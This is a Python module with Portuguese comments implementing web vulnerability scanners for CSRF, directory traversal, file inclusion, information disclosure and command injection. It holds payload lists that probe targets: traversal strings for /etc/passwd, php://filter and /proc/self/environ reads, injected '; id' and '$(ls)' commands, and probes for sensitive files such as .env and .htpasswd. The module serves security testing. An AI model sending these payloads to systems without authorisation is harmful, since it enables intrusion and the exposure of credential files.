# -*- coding: utf-8 -*-
"""
Scanners de vulnerabilidades para a ferramenta de varredura web.

Cada classe abaixo é responsável por detectar um tipo de vulnerabilidade:
- CSRF (falta de token em formulários POST)
- Directory Traversal
- File Inclusion (LFI/RFI)
- Information Disclosure (erros, arquivos sensíveis, dados sensíveis)
- Command Injection

Todos os métodos retornam `list[dict]` com chaves:
    type, url, parameter, severity, confidence, evidence, (payload opcional)
"""

from __future__ import annotations

import copy
import re
from typing import Dict, Iterable, List, Optional, Tuple

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# ----------------------------- Configuração geral -----------------------------

DEFAULT_TIMEOUT = 8
DEFAULT_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0 Safari/537.36"
    )
}

def _safe_get(url: str, *, params: Optional[dict] = None) -> Optional[requests.Response]:
    """Requisição GET resiliente (não levanta exceção)."""
    try:
        return requests.get(url, params=params, headers=DEFAULT_HEADERS, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
    except Exception:
        return None


def _clone_params(params: Dict) -> Dict:
    """Copia rasa preservando listas/strings (evita mutação compartilhada)."""
    out = {}
    for k, v in (params or {}).items():
        out[k] = copy.deepcopy(v)
    return out


# -------------------------- Payloads e Padrões Base ---------------------------

CSRF_PATTERNS = ["csrf", "token", "nonce"]

TRAVERSAL_PAYLOADS = [
    "../../../../../etc/passwd",
    r"..\..\..\windows\win.ini",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
]

LFI_PAYLOADS = [
    "../../../../../etc/passwd",
    "/etc/passwd",
    r"c:\windows\win.ini",
    "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
]

# Para RFI não fazemos chamadas externas. O objetivo é provocar mensagens de erro
# que denunciem tentativas de incluir URLs remotas.
RFI_PAYLOADS = [
    "http://127.0.0.1/",              # pode gerar erro de conexão
    "http://example.com/shell.txt",   # pode aparecer em mensagens de erro
    "//example.com/shell.txt",
]

INFO_DISCLOSURE_PATTERNS = {
    "error_messages": [
        "sql error", "mysql error", "postgres error",
        "stack trace", "stacktrace", "traceback",
        "debug", "warning:", "notice:", "fatal error",
        "undefined index", "undefined variable",
    ],
    "sensitive_files": [
        ".git/HEAD", ".env", ".htaccess", ".htpasswd",
        "server-status", "wp-config.php.bak",
        "config.php.bak", "database.yml", ".DS_Store",
    ],
    "sensitive_data": [
        r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b",  # e-mail
        r"\bAKIA[0-9A-Z]{16}\b",                               # AWS Access Key (padrão)
        r"\b\d{3}[-.]?\d{3}[-.]?\d{4}\b",                      # telefone simples
        r"\b\d{3}[-]?\d{2}[-]?\d{4}\b",                        # SSN (formato EUA)
    ],
}

CMD_INJECTION_PAYLOADS = [
    "| id", "; id", "`id`", "$(id)", "|| id", "& id",
    "| ls", "; ls", "`ls`", "$(ls)", "|| ls", "& ls",
]

CMD_INJECTION_PATTERNS = [
    "uid=", "gid=", "groups=",               # *nix `id`
    "root:x:", "bin:x:",                     # /etc/passwd
    "Directory of", "Volume Serial Number",  # Windows `dir`
]

# ---------------------------------- Scanners ----------------------------------


class CSRFScanner:
    """Detecta formulários POST sem token CSRF."""

    def __init__(self, logger):
        self.logger = logger

    def check_csrf_forms(self, url: str, html_content: str) -> List[dict]:
        """Alias compatível (preferido)."""
        return self.check_csrf_protection(url, html_content)

    def check_csrf_protection(self, url: str, html_content: str) -> List[dict]:
        """Procura <form method="post"> sem input hidden com nome contendo csrf|token|nonce."""
        vulns: List[dict] = []
        soup = BeautifulSoup(html_content or "", "html.parser")
        forms = soup.find_all("form", method=re.compile(r"^post$", re.I))

        for form in forms:
            csrf_inputs = form.find_all(
                "input",
                attrs={"type": "hidden", "name": re.compile(r"(csrf|token|nonce)", re.I)},
            )
            if not csrf_inputs:
                vuln = {
                    "type": "CSRF",
                    "url": url,
                    "parameter": "form",
                    "severity": "Medium",
                    "confidence": "Medium",
                    "evidence": "Form without CSRF token",
                }
                vulns.append(vuln)
                try:
                    self.logger.warning(f"[CSRF] Possible missing token at {url}")
                except Exception:
                    pass

        return vulns


class DirectoryTraversalScanner:
    """Testes de Directory Traversal."""

    def __init__(self, logger):
        self.logger = logger

    def check_traversal(self, url: str, params: Dict) -> List[dict]:
        vulns: List[dict] = []

        for pname, _ in (params or {}).items():
            for payload in TRAVERSAL_PAYLOADS:
                test_params = _clone_params(params)
                test_params[pname] = payload
                resp = _safe_get(url, params=test_params)
                if not resp:
                    continue

                if any(sig in resp.text for sig in ["root:x:0:0", "[boot loader]", "Windows Registry", "apache:x:"]):
                    vuln = {
                        "type": "Directory Traversal",
                        "url": url,
                        "parameter": pname,
                        "payload": payload,
                        "severity": "High",
                        "confidence": "High",
                        "evidence": "Sensitive file content found in response",
                    }
                    vulns.append(vuln)
                    try:
                        self.logger.warning(f"[Traversal] {url} param={pname} payload={payload}")
                    except Exception:
                        pass

        return vulns


class FileInclusionScanner:
    """Testes de LFI/RFI."""

    def __init__(self, logger):
        self.logger = logger

    def check_file_inclusion(self, url: str, params: Dict) -> List[dict]:
        vulns: List[dict] = []

        # LFI
        for pname, _ in (params or {}).items():
            for payload in LFI_PAYLOADS:
                test_params = _clone_params(params)
                test_params[pname] = payload
                resp = _safe_get(url, params=test_params)
                if not resp:
                    continue

                if any(sig in resp.text for sig in ["root:x:0:0", "apache:x:", "[boot loader]", "HTTP/1.1", "HTTP/1.0"]):
                    vuln = {
                        "type": "Local File Inclusion",
                        "url": url,
                        "parameter": pname,
                        "payload": payload,
                        "severity": "High",
                        "confidence": "High",
                        "evidence": "Sensitive file content found in response",
                    }
                    vulns.append(vuln)
                    try:
                        self.logger.warning(f"[LFI] {url} param={pname} payload={payload}")
                    except Exception:
                        pass

        # RFI (heurística: mensagens de erro envolvendo URLs remotas)
        rfi_error_hints = [
            "failed to open stream", "http wrapper", "URL file-access is disabled",
            "allow_url_fopen", "no such host", "timed out while opening",
        ]
        for pname, _ in (params or {}).items():
            for payload in RFI_PAYLOADS:
                test_params = _clone_params(params)
                test_params[pname] = payload
                resp = _safe_get(url, params=test_params)
                if not resp:
                    continue

                if any(hint.lower() in resp.text.lower() for hint in rfi_error_hints) or "http" in payload and payload in resp.text:
                    vuln = {
                        "type": "Remote File Inclusion",
                        "url": url,
                        "parameter": pname,
                        "payload": payload,
                        "severity": "Critical",
                        "confidence": "Medium",
                        "evidence": "Remote URL inclusion attempt indicated by error/echo",
                    }
                    vulns.append(vuln)
                    try:
                        self.logger.warning(f"[RFI] {url} param={pname} payload={payload}")
                    except Exception:
                        pass

        return vulns


class InfoDisclosureScanner:
    """Exposição de informações (erros, arquivos e dados sensíveis)."""

    def __init__(self, logger):
        self.logger = logger

    def check_info_disclosure(self, url: str, response_text: str) -> List[dict]:
        vulns: List[dict] = []

        # 1) Mensagens de erro
        for pattern in INFO_DISCLOSURE_PATTERNS["error_messages"]:
            if pattern.lower() in (response_text or "").lower():
                vuln = {
                    "type": "Information Disclosure",
                    "url": url,
                    "parameter": "response",
                    "severity": "Medium",
                    "confidence": "High",
                    "evidence": f"Error message found: {pattern}",
                }
                vulns.append(vuln)
                try:
                    self.logger.warning(f"[InfoDisc] Error pattern at {url}: {pattern}")
                except Exception:
                    pass

        # 2) Arquivos sensíveis na raiz/base do site
        base_url = urljoin(url, "/")
        for path in INFO_DISCLOSURE_PATTERNS["sensitive_files"]:
            test_url = urljoin(base_url, path)
            resp = _safe_get(test_url)
            if resp is not None and resp.status_code == 200:
                vuln = {
                    "type": "Sensitive File Exposure",
                    "url": test_url,
                    "parameter": "path",
                    "severity": "High",
                    "confidence": "Medium",
                    "evidence": f"Accessible sensitive file: {path}",
                }
                vulns.append(vuln)
                try:
                    self.logger.warning(f"[InfoDisc] Sensitive file accessible: {test_url}")
                except Exception:
                    pass

        # 3) Dados sensíveis no HTML
        for rx in INFO_DISCLOSURE_PATTERNS["sensitive_data"]:
            for m in re.finditer(rx, response_text or ""):
                sample = m.group(0)
                vuln = {
                    "type": "Sensitive Data Exposure",
                    "url": url,
                    "parameter": "content",
                    "severity": "High",
                    "confidence": "Medium",
                    "evidence": f"Found pattern: {sample[:8]}...",
                }
                vulns.append(vuln)
                try:
                    self.logger.warning(f"[InfoDisc] Sensitive data pattern at {url}")
                except Exception:
                    pass

        return vulns


class CommandInjectionScanner:
    """Injeção de comandos via parâmetros (heurística por padrões de saída)."""

    def __init__(self, logger):
        self.logger = logger

    def check_command_injection(self, url: str, params: Dict) -> List[dict]:
        vulns: List[dict] = []

        for pname, _ in (params or {}).items():
            for payload in CMD_INJECTION_PAYLOADS:
                test_params = _clone_params(params)
                test_params[pname] = payload
                resp = _safe_get(url, params=test_params)
                if not resp:
                    continue

                if any(sig in resp.text for sig in CMD_INJECTION_PATTERNS):
                    vuln = {
                        "type": "Command Injection",
                        "url": url,
                        "parameter": pname,
                        "payload": payload,
                        "severity": "Critical",
                        "confidence": "High",
                        "evidence": "Command output signature found in response",
                    }
                    vulns.append(vuln)
                    try:
                        self.logger.warning(f"[CmdInj] {url} param={pname} payload={payload}")
                    except Exception:
                        pass
                    # evita multi-match do mesmo payload
        return vulns


__all__ = [
    "CSRFScanner",
    "DirectoryTraversalScanner",
    "FileInclusionScanner",
    "InfoDisclosureScanner",
    "CommandInjectionScanner",
    # constantes úteis para testes
    "CSRF_PATTERNS",
    "TRAVERSAL_PAYLOADS",
    "LFI_PAYLOADS",
    "RFI_PAYLOADS",
    "INFO_DISCLOSURE_PATTERNS",
    "CMD_INJECTION_PAYLOADS",
    "CMD_INJECTION_PATTERNS",
]
